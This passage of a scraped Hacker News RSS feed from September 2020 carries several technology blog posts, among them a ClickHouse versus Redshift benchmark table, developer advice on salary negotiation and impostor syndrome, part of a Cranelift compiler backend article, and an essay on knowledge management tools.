0 rows in set. Elapsed: 335.122 sec. Processed 1.31 billion rows, 167.40 GB (3.91 million rows/s., 499.52 MB/s.)</code></pre>
</div><p>Here we used yet another table function ‘remote()’ that allows us to query between ClickHouse nodes. Note that we inserted data into a function, which is also a unique ClickHouse extension.</p><p>Below are query results for all tested configurations. We have also added Mark Litwintschick’s historical data in the last two columns for the reference.&nbsp;</p><div><figure>
<table>
<tbody>
<tr>
<td><strong>Query</strong></td>
<td><strong>ClickHouse </strong><strong><br></strong><strong>m5.8xlarge,</strong><strong><br></strong><strong>Aug 2020</strong></td>
<td><strong>ClickHouse m5.8xlarge x2,</strong><strong><br></strong><strong>Aug 2020</strong></td>
<td><strong>RedShift dc2.8xlarge x2,</strong><strong><br></strong><strong>Aug 2020</strong></td>
<td><a href="https://tech.marksblogg.com/billion-nyc-taxi-rides-clickhouse-cluster.html"><strong>ClickHouse</strong><strong><br></strong><strong>c5d.9xlarge x3, Jan 2019</strong></a></td>
<td><a href="https://tech.marksblogg.com/billion-nyc-taxi-rides-redshift-large-cluster.html"><strong>Redshift ds2.8xlarge x6, June 2016</strong></a></td>
</tr>
<tr>
<td>Data load</td>
<td>280</td>
<td>n/a</td>
<td>506</td>
<td>n/a</td>
<td>673</td>
</tr>
<tr>
<td>Q1</td>
<td>0.62</td>
<td>0.35</td>
<td>0.59</td>
<td>0.69</td>
<td>1.25</td>
</tr>
<tr>
<td>Q2</td>
<td>1.11</td>
<td>0.58</td>
<td>0.82</td>
<td>0.58</td>
<td>2.25</td>
</tr>
<tr>
<td>Q3</td>
<td>1.…</td></tr></tbody></table></figure></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark">https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark</a></em></p>]]>
            </description>
            <link>https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518926</guid>
            <pubDate>Fri, 18 Sep 2020 16:41:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Negotiate Your Salary as a Developer]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518792">thread link</a>) | @fazlerocks
<br/>
September 18, 2020 | https://catalins.tech/how-to-negotiate-your-salary-as-a-developer | <a href="https://web.archive.org/web/*/https://catalins.tech/how-to-negotiate-your-salary-as-a-developer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1597245333467/5UNrmc9eH.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><hr>

<p>Knowing how to negotiate your salary as a developer is a must. When I received my first job offer, I was so excited to get a job, that I blindly accepted it. I did not even think of negotiating the salary. After all, I did not want to risk losing the offer. You have been in the same situation at least once, right?</p>
<p>However, most of the time, we leave money on the table by not negotiating our salary.</p>

<p>The first offer is never the best or the final offer. Companies always leave room in case the candidate wants to negotiate it. By not negotiating, you leave money on the table.</p>
<p>But how should I know how much to ask for? Use websites like Glassdoor to find the appropriate salary for a similar position and a similar experience. Once you have this information, adjust the salary based on your circumstances. At this point, you should have a rough idea of how much you deserve.</p>
<p>However, you should not blindly ask for more without reasons. If you ask for money, come with reasons why you deserve that compensation. Specify what you bring to the table.</p>

<p>I think I received this question millions of times. First of all, in many countries and states (USA), it is illegal to ask for the current salary. The rule of thumb is never to specify the salary you are making.</p>
<p>There are two options when answering this question:</p>
<ol>
<li>Avoid the question and try to move on</li>
<li>If they keep insisting, use the salary you want as your “current salary.”
Anyway, the best thing is never to mention the current salary. Companies and recruiters should not care about your current situation in terms of salary. </li>
</ol>

<p>Another reason why people do not negotiate is that they are afraid the company rescinds the offer. I do not think any respectable company is going to revoke the offer if you negotiate the salary.</p>
<p>In the worst case, they are going to cancel the offer. However, would you like to work for a company that does this? You just saved yourself from the trouble.</p>
<p>Therefore, do not be afraid to negotiate. In the worst case, they are going to say ‘no’. In the best case, you are going to get better compensation. On the other hand, if they rescind the offer, you do not want to work for them anyway.</p>

<p>This advice is not actionable straight away, and it depends on the circumstances. However, having alternative offers helps a lot because it puts you in a favourable position. If your negotiation does not go well, you always have a second option. The company also knows that you have nothing to lose.</p>
<p>However, I want to repeat that it depends on the circumstances. The more offers you have, the better it is for you. One the other side, if you do not have multiple offers, it is not the end of the world. </p>
<p>Let us pretend you have alternative offers. How can you use them to leverage your position?</p>
<p>You could say something along these lines: “I have multiple offers from x, y, z with better compensation. However, I like your products and your mission the most. As a result, I would like to work here because I think it is a better fit for me.” Of course, this is just an example, but you can use something similar.</p>
<p>Thus, if you have other offers, learn how to use them at your advantage.</p>

<p>These are my tops tips when it comes to knowing how to negotiate your salary as a developer. The list is not exhaustive, and there are many other aspects of negotiating.</p>
<p>I hope the article gives you some insights and helps you see negotiating with other eyes. The essential thing is to negotiate your salaries. Otherwise, you leave money on the table.</p>
<blockquote>
<p>If you enjoyed the article, consider sharing it so more people can benefit from it! Also, feel free to @ me on Twitter with your opinions.</p>
</blockquote>
</div></div></section></div></div>]]>
            </description>
            <link>https://catalins.tech/how-to-negotiate-your-salary-as-a-developer</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518792</guid>
            <pubDate>Fri, 18 Sep 2020 16:28:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Impostor Syndrome – A Developer's Best Friend]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518783">thread link</a>) | @fazlerocks
<br/>
September 18, 2020 | https://catalins.tech/impostor-syndrome-a-developers-best-friend | <a href="https://web.archive.org/web/*/https://catalins.tech/impostor-syndrome-a-developers-best-friend">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1597582091064/7sW4dzIjK.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><hr>

<p>Reading the title, you might say something is wrong with me. But I dare to repeat it. The impostor syndrome is a developer's best friend when appropriately managed. I also believe that the impostor syndrome is more prominent in software development due to the large volume of knowledge you need to possess, and the constant changing of tools and programming languages. The programming language and tools you are using today might become obsolete in one year. That means "starting from the zero" (an exaggeration to emphasise the point) again. It is a very dynamic environment where you have to learn continuously. The ones that survive are the ones that can adapt. </p>
<p>Thus, it is almost impossible to get rid of the impostor syndrome. Why not learn to live with it?</p>

<p>Let me tell you another thing. Almost all of us suffer from impostor syndrome. There is always someone better than us. There is always something that we do not know. There is always something to learn. A new tool gets released every day. A new technology or programming language emerges every once in a while. You can never learn and know all of them. Trying to keep up is very difficult as well. And that is how the syndrome creeps in. You start asking yourself questions such as "Will I ever make it?", "Will I ever be able to do x, y, z?", "Will I know technology x, y, z?", "What if I am an impostor?", and the list goes on. The answer is yes, yes, and yes,</p>
<p>By the way, the syndrome is even worse for beginners, who feel they are never going to make it in this field. Been there, done that. You will make it with persistent, hard work.</p>

<p>You are not the only one asking himself/herself those questions. The developer next to you at work has the same questions. The developer you follow on Twitter has the same questions. That YouTuber with 50000 subscribers has the same questions. I have the same questions, even though I have a job and I am doing very well.</p>
<p>You are not the only one with these questions, and you will never be. The impostor syndrome is part of us, and as I said, it is more prominent in our industry. Of course, some people deal with it better, so it is not that obvious they have it as well. But almost all of us have it, trust me.</p>

<p>First of all, you should know that it can be your best friend because it pushes you to become better. The feeling that you are not made for this industry, or that you do not know enough, could push you to learn more. As a result, you better yourself every day. I use the impostor syndrome as fuel, as motivation to become a better developer, and it works very well. Beware though; it can quickly push you to burn out. Trust me, you do not want that.</p>
<p>Secondly, whenever those questions and irrational thoughts creep into your mind, REMEMBER that all developers suffer from this syndrome. REMEMBER that there is always a developer better than you. But also REMEMBER that there is always a developer that is beneath you. REMEMBER that you can never know everything, and that is fine. You only need to know a handful of tools, which are relevant to your job. With perseverance and hard work, you can become a developer.</p>
<p>Will you become the best programmer? Probably no. Will you work at Amazon/Facebook/Google/Apple? Probably no. Will you make millions? Probably no. Will you develop the best next thing? Probably no. But guess what? That is fine. You do not have to do any of those to be a decent developer. Actually, most of us never achieve those goals.</p>

<ul>
<li>Almost all of us has the impostor syndrome.</li>
<li>You can make it in this industry with hard work.</li>
<li>You will never know everything, and that is fine.</li>
<li>There are always developers better than, but there are also developers worse than you.</li>
<li>You do not have to be a "superstar" developer. Being a decent developer is enough.</li>
</ul>
<blockquote>
<p>If you enjoyed the article, consider sharing it so more people can benefit from it! Also, feel free to @ me on Twitter with your opinions.</p>
</blockquote>
</div></div></section></div></div>]]>
            </description>
            <link>https://catalins.tech/impostor-syndrome-a-developers-best-friend</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518783</guid>
            <pubDate>Fri, 18 Sep 2020 16:27:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A New Backend for Cranelift, Part 1: Instruction Selection]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518724">thread link</a>) | @cfallin
<br/>
September 18, 2020 | https://cfallin.org/blog/2020/09/18/cranelift-isel-1/ | <a href="https://web.archive.org/web/*/https://cfallin.org/blog/2020/09/18/cranelift-isel-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>This post is the first in a three-part series about my recent work on
<a href="https://github.com/bytecodealliance/wasmtime/tree/main/cranelift">Cranelift</a>
as part of my day job at Mozilla. In this first post, I will set some context
and describe the instruction selection problem. In particular, I’ll talk about
a revamp to the instruction selector and backend framework in general that
we’ve been working on for the last nine months or so. This work has been
co-developed with my brilliant colleagues Julian Seward and <a href="https://benj.me/">Benjamin
Bouvier</a>, with significant early input from <a href="https://github.com/sunfishcode">Dan
Gohman</a> as well, and help from all of the
wonderful Cranelift hackers.</p>

<h2 id="background-cranelift">Background: Cranelift</h2>

<p>So what is Cranelift? The project is a compiler framework written in
<a href="https://www.rust-lang.org/">Rust</a> that is designed especially (but not
exclusively) for <a href="https://en.wikipedia.org/wiki/Just-in-time_compilation">just-in-time
compilation</a>. It’s a
general-purpose compiler: its most popular use-case is to compile
<a href="https://www.webassembly.org/">WebAssembly</a>, though several other frontends
exist, for example,
<a href="https://github.com/bjorn3/rustc_codegen_cranelift">cg_clif</a>, which adapts the
Rust compiler itself to use Cranelift. Folks at Mozilla and several other
places have been developing the compiler for a few years now.  It is the
default compiler backend for
<a href="https://github.com/bytecodealliance/wasmtime">wasmtime</a>, a runtime for
WebAssembly outside the browser, and is used in production in several other
places as well. We recently flipped the switch to turn on Cranelift-based
WebAssembly support in nightly Firefox on <a href="https://en.wikipedia.org/wiki/AArch64">ARM64
(AArch64)</a> machines, including most
smartphones, and if all goes well, it will eventually go out in a stable
Firefox release. Cranelift is developed under the umbrella of the <a href="https://bytecodealliance.org/">Bytecode
Alliance</a>.</p>

<p>In the past nine months, we have built a new framework in Cranelift for the
“machine backends”, or the parts of the compiler that support particular CPU
instruction sets. We also added a new backend for AArch64, mentioned above, and
filled out features as needed until Cranelift was ready for production use in
Firefox. This blog post sets some context and describes the design process that
went into the backend-framework revamp.</p>

<p>It can be a bit confusing to keep all of the moving parts straight. Here’s a
visual overview of Cranelift’s place among various other components, focusing
on two of the major Rust crates (the Wasm frontend and the codegen backend) and
several of the other programs that make use of Cranelift:</p>

<p><img src="https://cfallin.org/assets/2020-09-10-cranelift-components.svg" alt="Figure: Cranelift and other components"></p>

<h2 id="old-backend-design-instruction-legalizations">Old Backend Design: Instruction Legalizations</h2>

<p>To understand the work that we’ve done recently on Cranelift, we’ll need to
zoom into the <code>cranelift_codegen</code> crate above and talk about how it <em>used to</em>
work. What is this “CLIF” input, and how does the compiler translate it to
machine code that the CPU can execute?</p>

<p>Cranelift makes use of
<a href="https://github.com/bytecodealliance/wasmtime/blob/main/cranelift/docs/ir.md">CLIF</a>,
or the Cranelift IR (Intermediate Representation) Format, to represent the code
that it is compiling. Every compiler that performs program optimizations uses
some form of an <a href="https://en.wikipedia.org/wiki/Intermediate_representation">Intermediate Representation
(IR)</a>: you can think
of this like a virtual instruction set that can represent all the operations a
program is allowed to do. The IR is typically simpler than real instruction
sets, designed to use a small set of well-defined instructions so that the
compiler can easily reason about what a program means. The IR is also
independent of the CPU architecture that the compiler eventually targets; this
lets much of the compiler (such as the part that generates IR from the input
programming language, and the parts that optimize the IR) be reused whenever
the compiler is adapted to target a new CPU architecture.  CLIF is in <a href="https://en.wikipedia.org/wiki/Static_single_assignment_form">Static
Single Assignment
(SSA)</a> form, and
uses a conventional <a href="https://en.wikipedia.org/wiki/Control-flow_graph">control-flow
graph</a> with basic blocks
(though it previously allowed extended basic blocks, these have been phased
out). Unlike many SSA IRs, it represents φ-nodes with block parameters
rather than explicit φ-instructions.</p>

<p>Within <code>cranelift_codegen</code>, before we revamped the backend design, the program
remained in CLIF throughout compilation and up until the compiler emitted the
final machine code. This might seem to contradict what we just said: how can
the IR be machine-independent, but also be the final form from which we emit
machine code?</p>

<p>The answer is that the old backends were built around the concept of
“legalization” and “encodings”. At a high level, the idea is that every
<em>Cranelift</em> instruction either corresponds to one <em>machine</em> instruction, or can
be replaced by a sequence of other <em>Cranelift</em> instructions. Given such a
mapping, we can refine the CLIF in steps, starting from arbitrary
machine-independent instructions from earlier compiler stages, performing edits
until the CLIF corresponds 1-to-1 with machine code. Let’s visualize this
process:</p>

<p><img src="https://cfallin.org/assets/2020-09-10-cranelift-legalization.svg" alt="Figure: legalization by repeated instruction expansion"></p>

<p>A very simple example of a CLIF instruction that has a direct “encoding” to a
machine instruction is <code>iadd</code>, which just adds two integers. On essentially any
modern architecture, this should map to a simple ALU instruction that adds two
registers.</p>

<p>On the other hand, many CLIF instructions do not map cleanly. Some arithmetic
instructions fall into this category: for example, there is a CLIF instruction
to count the number of set bits in an integer’s binary representation
(<code>popcount</code>); not every CPU has a single instruction for this, so it might be
expanded into a longer series of bit manipulations. There are operations that
are defined at a higher semantic level, as well, that will necessarily be
lowered with expansions: for example, accesses to Wasm memories are lowered
into operations that fetch the linear memory base and its size, bounds-check
the Wasm address against the limit, compute the real address for the Wasm
address, and perform the access.</p>

<p>To compile a function, then, we iterate over the CLIF and find instructions
with no direct machine encodings; for each, we simply expand into the legalized
sequence, and then recursively consider the instructions in that sequence. We
loop until all instructions have machine encodings. At that point, we can emit
the bytes corresponding to each instruction’s encoding<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>.</p>

<h2 id="growing-pains-and-a-new-backend-framework">Growing Pains, and a New Backend Framework?</h2>

<p>There are a number of advantages to the legacy Cranelift backend design, which
performs expansion-based legalization with a single IR throughout. As one might
expect, though, there are also a number of drawbacks. Let’s discuss a few of
each.</p>

<h3 id="single-ir-and-legalization-pros">Single IR and Legalization: Pros</h3>

<ol>
  <li>
    <p>By operating on a single IR all the way to machine-code emission, the same
optimizations can be applied at multiple stages. For example, consider a
legalization expansion that turns a high-level “access Wasm memory”
instruction into a sequence of loads, adds and bounds-checks. If many such
sequences occur in one function, we might be able to factor out common
portions (e.g.: computing the base of the Wasm memory).  Thus the
legalization scheme exposes as much code as possible, at as many stages as
possible, to opportunities for optimization. The legacy Cranelift pipeline
in fact works in this way: it runs “pre-opt” and “post-opt” optimization
passes, before and after legalization respectively.</p>
  </li>
  <li>
    <p>If <em>most</em> of the Cranelift instructions become one machine instruction, and
few legalizations are necessary, then this scheme can be very fast: it
becomes simply a single traversal to fill in “encodings”, which were
represented by small indices into a table.</p>
  </li>
</ol>

<h3 id="single-ir-and-legalization-cons">Single IR and Legalization: Cons</h3>

<ol>
  <li>
    <p>Expansion-based legalization may not always result in
optimal code. So far we’ve seen that legalization can convert from CLIF to
machine instructions with one-to-one or one-to-many mappings. However, there
are sometimes also <em>single</em> machine instructions that implement the behavior of
<em>multiple</em> CLIF instructions, i.e. a many-to-one mapping. In order to generate
efficient code, we want to be able to make use of these instructions.</p>

    <p>For example, on x86, an instruction that references memory can compute an
address like <code>base + scale * index</code>, where <code>base</code> and <code>index</code> are registers
and <code>scale</code> is 1, 2, 4, or 8. There is no notion of such an address mode in
CLIF, so we would want to pattern-match the raw <code>iadd</code> (add) and <code>ishl</code>
(shift) or <code>imul</code> (multiply) operations when they occur in the address
computation. Then, we would want to somehow select the encoding on the
<code>load</code> instruction based on the fact that its input is some specific
combination of adds and shifts/multiplies.  This seems to break the
abstraction that the encoding represents only that instruction’s operation.</p>

    <p>In principle, we could implement more general pattern matching for legalization
rules to allow many-to-one mappings. However, this would be a significant
refactor; and as long as we were reconsidering the design in whole, there were
other reasons to avoid patching the problem in this way.</p>
  </li>
  <li>
    <p>There is a conceptual difficulty with the single-IR approach: there is
no static representation of which instructions are expanded into which others
and it is difficult to reason about the correctness and termination properties
of legalization as a whole.</p>

    <p>Specifically, the expansion-based legalization rules must obey a partial
order among instructions: if A expands into a sequence including B, then B
cannot later expand into A. In practice, mappings were mostly one-to-one,
and for those that weren’t, there was a clear domain separation between the
“input” high-level instructions and the “machine-level” instructions.
However, for more complex machines, or more complex matching schemes that
attempt to make better use of the target instruction set, this could become
a real difficulty for the machine-backend author to keep straight.</p>
  </li>
  <li>
    <p>There are efficiency concerns with expansion-based legalization. At
an algorithmic level, we prefer to avoid fixpoint loops (in this case,
“continue expanding until no more expansions exist”) whenever possible. The
runtime is bounded, but the bound is somewhat difficult to reason about,
because it depends on the maximum depth of chained expansions.</p>

    <p>The data structures that enable in-place editing are also much slower than
we would like. Typically, compilers store IR instructions in linked lists to
allow for in-place editing. …</p></li></ol></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cfallin.org/blog/2020/09/18/cranelift-isel-1/">https://cfallin.org/blog/2020/09/18/cranelift-isel-1/</a></em></p>]]>
            </description>
            <link>https://cfallin.org/blog/2020/09/18/cranelift-isel-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518724</guid>
            <pubDate>Fri, 18 Sep 2020 16:22:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Z80, the 8-bit Number Cruncher (2011)]]>
            </title>
            <description>
<![CDATA[
Score 59 | Comments 51 (<a href="https://news.ycombinator.com/item?id=24518158">thread link</a>) | @elvis70
<br/>
September 18, 2020 | http://www.andreadrian.de/oldcpu/Z80_number_cruncher.html | <a href="https://web.archive.org/web/*/http://www.andreadrian.de/oldcpu/Z80_number_cruncher.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.andreadrian.de/oldcpu/Z80_number_cruncher.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518158</guid>
            <pubDate>Fri, 18 Sep 2020 15:39:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building an Ideal Knowledge Management System for Content Creators]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518086">thread link</a>) | @laybak
<br/>
September 18, 2020 | https://knowledgeartist.org/article/ideal-knowledge-management-system-content-creators | <a href="https://web.archive.org/web/*/https://knowledgeartist.org/article/ideal-knowledge-management-system-content-creators">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><span>In this article, I lay out a vision of the dream tools to help content creators manage and apply their cumulative learnings. I outline the desirable properties of such tools and how we can build them.</span></p> <p><span>Let's get started.</span></p>  <p><h3><span>Knowledge Synthesis vs Passive Consumption</span></h3></p> <p><span>I use the term "content creators" to refer to a variety of knowledge workers, including bloggers, video producers, researchers, journalists, and more. The many types of content creators are characterized by a common basic workflow: the process of consuming and synthesizing knowledge. Or more generally, learning and teaching. </span></p> <p><span>This is distinct from the mere passive consumption of information. It involves digesting information, trying to apply it, condensing it, sharing it, and making it your own. In the process, you understand the knowledge better yourself. And the output you create helps others learn.</span></p>  <p><h3><span>Ease of Capture</span></h3></p> <p><span>As you read, learn, or just live life, you come across many tidbits and ideas you want to remember. These are inspirations and materials that you can later make use of. </span></p> <p><span>But if you don't capture these ideas, you tend to lose them forever. And it is hard to generate relevant ideas on demand when you need them. So capturing is an always-on process, and your collection of ideas grows over time.</span></p> <p><span>The challenge with capturing ideas is that it is hard to know in advance when you will need them. If the friction to capture is too high, it simply won't happen. The capturing process must be effortless. </span></p>  <p><h3><span>Save from Anywhere</span></h3></p> <p><span>Ideas can come to you in many different contexts: conversations with friends, newsletters, books, podcasts, documentaries, walking a dog in the park, etc. The best ways to capture ideas are different for each scenario. You want to go with whichever method is the most convenient in the moment so you can resume whatever activity you were doing. </span></p> <p><span>As technology evolves, we would have an increasing variety of platforms or media we can use to save ideas. Currently, you can write it down on a piece of paper, take notes on your phone, leave a bookmark, highlight the passage, take a screenshot, and more.</span></p> <p><span>But in the future it seems inevitable that we would incorporate additional modes of inputs such as wearables like glasses with cameras, virtual reality recordings, and brain-computer interfaces.</span></p>  <p><h3><span>Integrated and Queryable Knowledge</span></h3></p> <p><span>As you use multiple tools, a problem that arises over time is that your captured knowledge becomes scattered across different places. Using a fragmented set of tools to manage your knowledge is costly. It makes it harder to retrieve any information you need. </span></p> <p><span>Currently, your book notes, product specs, and notes for online courses likely live in disparate platforms. We can do better. Your information should not be siloed. It should be searchable in one place. </span></p>  <p><h3><span>Customizable and Extensible</span></h3></p> <p><span>It is unlikely that any single tool will be the best knowledge management solution for all scenarios and workflows. No matter how well-designed a product is, there are use cases that are not accounted for, or are de-prioritized due to resource constraints. The best knowledge management tools you use should be extensible to fit your nuanced needs. Each tool you use needs to work well with the other components in your workflow, over a shared standard, open source code, or API. </span></p>  <p><h3><span>Free-form Digital Drawing</span></h3></p> <p><span>If I ask you to explain an abstract concept, one of the first things you would reach for is probably a pen, then paper or a whiteboard. This free-form drawing medium is expressive. It makes use of our spatial intuition. It is free-form. It helps you see otherwise non-obvious connections. But it is inconvenient to store, retrieve, and connect to existing knowledge. </span></p> <p><span>In contrast, a digital interface is easy to manipulate across platforms, but tends to be limited in expression. It tends to rely on text representation, which is often insufficient in conveying an idea, especially a complicated or abstract one.</span></p> <p><span>An ideal knowledge management system would marry the two to get us the best of both worlds: a digital interface that affords frictionless free-form drawing and is easy to maintain. Products such as </span> <a href="https://miro.com/" target="_blank"><span>Miro</span></a> <span> and </span> <a href="https://www.onenote.com/" target="_blank"><span>OneNote</span></a> <span> are a good step in this direction. </span></p>  <p><h3><span>Structured Knowledge &amp; Personal Knowledge Graph</span></h3></p> <p><span>The most common digital form of an idea is a </span> <em>note</em> <span>, typically stored in plaintext and organized in notebooks or folders. This is usually sufficient for the purpose of jotting down your thoughts. </span></p> <p><span>But these generic "Note" objects can become more useful when they are augmented with properties, relationships with other notes, and other metadata. These properties can be automatically extracted in the capturing process (e.g. "page number" and "book title" in a e-Book highlight), or custom-defined by the user (e.g. "years of experience required" on a "Job Posting" page). </span></p> <p><span>The interconnections between these individual notes can be structured in a </span> <a href="https://en.wikipedia.org/wiki/Knowledge_Graph" target="_blank"><span>knowledge graph</span></a> <span>, where an entity "Google" is connected to a collection of "Job" entities via the relationship "is hiring". A knowledge graph can be valuable in retrieving knowledge and answering queries. And search engines make extensive use of this to structure the world's knowledge. And on an individual level, </span> <em>personal knowledge graphs</em> <span> can have many interesting use cases for retrieval and automation. Tools like </span> <a href="https://www.notion.so/" target="_blank"><span>Notion</span></a> <span>, </span> <a href="https://coda.io/" target="_blank"><span>Coda</span></a> <span>, and </span> <a href="https://roamresearch.com/" target="_blank"><span>Roam Research</span></a> <span> offer more options for structuring knowledge for individual users. But this is just the beginning.</span></p>  <p><h3><span>Autosuggest for Thoughts</span></h3></p> <p><span>With richer representations of knowledge, machines can better "understand" our thoughts and compute on them. This can help streamline (or even automate) much of the research and idea generation workflows. </span></p> <p><span>Imagine this: when you are writing about a topic, your knowledge base can suggest semantically relevant content, either from your existing data, your team, or the collective knowledge on the web. You would no longer have to switch contexts to look up simple facts. Rather, thoughts can flow frictionlessly from inside your head to external digital artifacts that you can edit and share.</span></p> <p><span>And with generative language models (such as the </span> <a href="https://openai.com/blog/openai-api/" target="_blank"><span>GPT</span></a> <span>) maturing, you can provide a skeletal structure of your ideas, and have AI models complete your thoughts. Instead of guessing and generating random tokens, the model's outputs would be based on your thoughts that have already been digitized in your system.  </span></p> <p><span>With this close collaboration with machines in your knowledge work, information becomes truly at your fingertips.</span></p>  <p><h3><span>Prefer simple over complex</span></h3></p> <p><span>Complexity can creep in any system. Technology tools tend to get bloated over time. An initially focused feature set can turn into a maze of confusing and loosely related features. A constant challenge for feature-rich tools is discoverability of functionalities without cluttering the UI. These tools are supposed to save you time. It would defeat the purpose of using the tool if it takes longer to make it work the way you want than to work without it. </span></p> <p><span>To this end, </span> <a href="https://www.notion.so/" target="_blank"><span>Notion</span></a> <span> has raised the bar for simplicity for knowledge management tools. </span> <a href="https://www.figma.com/" target="_blank"><span>Figma</span></a> <span> also does a good job for hiding its rich feature set behind contextual actions.</span></p>  <p><h3><span>Shared, Collaborative Knowledge Structures</span></h3></p> <p><span>Knowledge synthesis is collaborative by nature. You consume works created by others and in turn create yours by mixing in your knowledge and experience. Knowledge management systems can accelerate this collaboration and empower every individual to leverage and build on each other's work as much as possible.</span></p> <p><span>Instead of knowledge being siloed within disciplines and locked inside individuals' minds, there is tremendous potential for tools to enable individuals to contribute to a collective knowledge structure, while saving time from having to build their own from scratch. The successes of platforms such as Wikipedia and open source software development are encouraging. We can build towards a future where individuals expose and attach parts of their private knowledge base to a public topic entity for others to fork for their own use. And this process can even be automated at some point.</span></p>  <p><span>We live in an exciting time for content creators and for innovation in the knowledge management space. The above are some of the promising directions for development, to work towards accelerating learning, making new discoveries, and making progress towards solving big problems.</span></p> <p><span>To contribute to this vision, I recently open sourced an extensible </span> <a href="https://github.com/jhlyeung/rumin-web-clipper" target="_blank"><span>web clipper browser extension</span></a> <span>, and I am working towards a few of the directions outlined above with </span> <a href="https://getrumin.com/" target="_blank"><span>Rumin</span></a> <span>. If you would like to chat about this further, feel free to </span> <a href="https://twitter.com/jhlyeung" target="_blank"><span>get in touch on Twitter</span></a> <span>.</span></p>        


          
            
            <p><em>Each week, I send out a newsletter where I share my learnings, new ways to see things, and new ways to feel.</em></p>
            <p><em>Enter your email below to subscribe.</em></p>

            
          
        </div></div>]]>
            </description>
            <link>https://knowledgeartist.org/article/ideal-knowledge-management-system-content-creators</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518086</guid>
            <pubDate>Fri, 18 Sep 2020 15:34:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: ugit – Learn Git Internals by Building Git in Python]]>
            </title>
            <description>
<![CDATA[
Score 223 | Comments 23 (<a href="https://news.ycombinator.com/item?id=24517925">thread link</a>) | @nikital
<br/>
September 18, 2020 | https://www.leshenko.net/p/ugit/ | <a href="https://web.archive.org/web/*/https://www.leshenko.net/p/ugit/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <p>Loading...</p>
    <section>
        
        
        
    </section>

    <section>
        
        
        <details>
            <summary>Download</summary>
            <p><span>Clone μgit using:</span>
                <span id="clone-cmd"></span>
                

                <span>Checkout this commit:</span>
                <span id="checkout-cmd"></span>
                
            </p>
        </details>
    </section>

    

    

    

    


</div>]]>
            </description>
            <link>https://www.leshenko.net/p/ugit/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517925</guid>
            <pubDate>Fri, 18 Sep 2020 15:22:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dating Our Clients]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517907">thread link</a>) | @mcrittenden
<br/>
September 18, 2020 | https://critter.blog/2020/09/18/dating-our-clients/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/09/18/dating-our-clients/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-1408">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>Client relationships have a lot in common with romantic relationships. This is <a href="https://creative-boost.com/client-relationships-are-like-dating/">well</a> <a href="https://www.leightoninteractive.com/blog/how-a-client-relationship-is-like-dating">documented</a> <a href="https://www.birdseed.io/business-customer-relationship-lot-like-dating/">elsewhere</a>. </p>



<p>Let’s start with the obvious parallels:</p>



<ul><li><em>Flirting and courting</em> = the sales process and trying to win the bid</li><li><em>Facebook official</em> = signing the contract</li><li><em>The honeymoon phase</em> = the first couple sprints when everything is still exciting and new</li><li><em>The first fight</em> = the first disagreement (often about scope)</li><li><em>The messy breakup </em>= using the termination clause in the contract</li><li><em>The amicable breakup </em>= a successful completion of the project</li><li><em>The messy divorce </em>= someone gets sued</li><li><em>The long term relationship = </em>a trusting partnership with no end date (this is the holy grail for many people, but not all)</li></ul>



<p>“<em>But romantic relationships are about love! Client relationships are about money! That is an important difference!</em>” That’s why I didn’t say that client relationships are <em>exactly </em>like romantic ones. But to be fair, aren’t both love and money about mutual benefit?</p>



<p>I could keep going and start talking about where kids and joint mortgages fit in, but it all gets very boring.</p>



